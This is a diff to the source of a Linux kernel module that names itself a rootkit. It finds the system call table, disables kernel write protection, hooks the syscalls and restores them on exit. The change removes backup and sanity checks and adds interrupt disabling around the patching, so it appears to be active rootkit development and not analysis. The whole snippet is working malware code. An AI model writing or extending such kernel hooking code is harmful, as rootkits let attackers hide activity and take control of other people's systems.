@@ -1,10 +1,9 @@
 #include "main.h"
-#include "config.h"
 #include "syscalltable.h"
 
 
 unsigned long **sys_call_table;
-//static unsigned long irq_flags;
+static unsigned long irq_flags;
 struct list_head* module_list_head = NULL;
 	
 void
@@ -52,36 +51,22 @@ ThisInit(void) {
 		DLog("get sys_call_table failure!");
 		return -1;
 	}
-	//	local_irq_save(irq_flags);
-	
-	if( 4 != prehack_sys_call_table())
-	{
-		DLog("backup sys call table failure!![%ld]", prehack_sys_call_table());
-		return 0;
-	}
-	
+	prehack_sys_call_table();
+	local_irq_save(irq_flags);
 	disable_write_protection();
 	hack_sys_call_talbe();
 	enable_write_protection();
-	
-	//local_irq_restore(irq_flags);
+	local_irq_restore(irq_flags);
 	return 0;
 }
-extern unsigned int offset_clone;
-extern unsigned int offset_vfork;
+
 static void __exit
 ThisExit(void) {
-	//local_irq_save(irq_flags);
-	if(0 == offset_clone || 0 == offset_vfork)
-	{	
-		DLog("offset_clone or offset_vfork NULL");
-		return;
-	}
+	local_irq_save(irq_flags);
 	disable_write_protection();	
 	unhack_sys_call_talbe();
 	enable_write_protection();
-	
-	//local_irq_restore(irq_flags);
+	local_irq_restore(irq_flags);
 	DLog("rootkit exit");
 }
 
